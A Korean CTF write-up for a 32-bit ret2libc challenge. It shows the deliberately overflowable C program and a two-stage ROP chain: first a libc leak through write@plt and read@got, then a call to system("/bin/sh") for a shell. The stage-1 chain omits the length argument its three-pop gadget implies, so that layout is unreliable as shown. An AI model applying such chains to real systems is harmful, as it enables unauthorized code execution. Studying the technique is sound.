# test_rop_x86 (basic_rop_x86)

32비트 ret2libc. `test_rop`와 로직은 같지만 **x86 호출 규약**(인자를 스택으로 전달)이 핵심 차이다.

## 대상 코드

```c
int main() {
    char buf[0x40] = {};
    initialize();
    read(0, buf, 0x400);   // BOF
    write(1, buf, sizeof(buf));
    return 0;
}
```

- 보호기법: NX 있음, PIE 없음, 카나리 없음.
- 오프셋: `buf(0x40) + SFP(0x8) = 0x48`.

## x86 호출 규약과 ROP 구성

x86(cdecl)은 인자를 **스택에 push**한다. 함수 리턴 후 스택에 쌓인 인자를 정리하려면 `pop; pop; ...; ret` 가젯으로 스택 포인터를 옮겨야 한다. 그래서 체인이 아래처럼 `[함수][정리 가젯][인자...]` 형태가 된다.

### 1단계 — libc 릭: `write(1, read@got, 4)`
```
write@plt
pop esi; pop edi; pop ebp; ret   ← write의 인자 3개를 정리
1                (fd)
read@got         (buf)
main             (write 리턴 후 실행될 주소 = 재진입)
```
> `read@got` 출력에서 `read` 오프셋을 빼 `libc_base` 계산.

### 2단계 — 셸: `system("/bin/sh")`
```
system
pop ebp; ret     ← system의 인자 1개 정리
&"/bin/sh"
```

## 핵심 개념

- **인자 전달 위치가 x64와 다름**: x64는 레지스터(`pop rdi` 등), x86은 스택. ROP 배치 순서를 반드시 규약에 맞춰야 한다.
- 반환 주소 바로 뒤에 `[함수, 정리가젯, 인자...]`를 놓는 32비트 ret2libc의 전형적 패턴.
